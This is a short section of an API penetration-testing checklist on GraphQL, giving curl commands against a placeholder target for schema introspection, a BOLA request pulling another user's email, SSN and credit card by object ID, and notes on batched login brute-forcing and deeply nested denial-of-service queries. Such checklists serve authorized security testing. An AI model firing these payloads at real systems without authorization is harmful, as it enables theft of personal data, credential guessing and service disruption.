## 3G. GraphQL-Specific Testing
*CRUXSS-API-GQL-01 through -03*

```bash
# Introspection (CRUXSS-API-GQL-01) — alone = Informational, reveals attack surface
curl -s "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' \
  | jq . | tee session/graphql-schema.json

# node() BOLA bypass (CRUXSS-API-GQL-03)
curl -s "https://TARGET/graphql" \
  -d '{"query":"{ node(id: \"dXNlcjoy\") { ... on User { email ssn creditCard } } }"}'

# Batching rate limit bypass (CRUXSS-API-GQL-02)
# Send 100 login attempts in one request body as JSON array

# Deep query DoS (CRUXSS-API-GQL-02, CRUXSS-API-RATE-02)
# {"query":"{ users { friends { friends { friends { friends { id } } } } } }"}
```

---

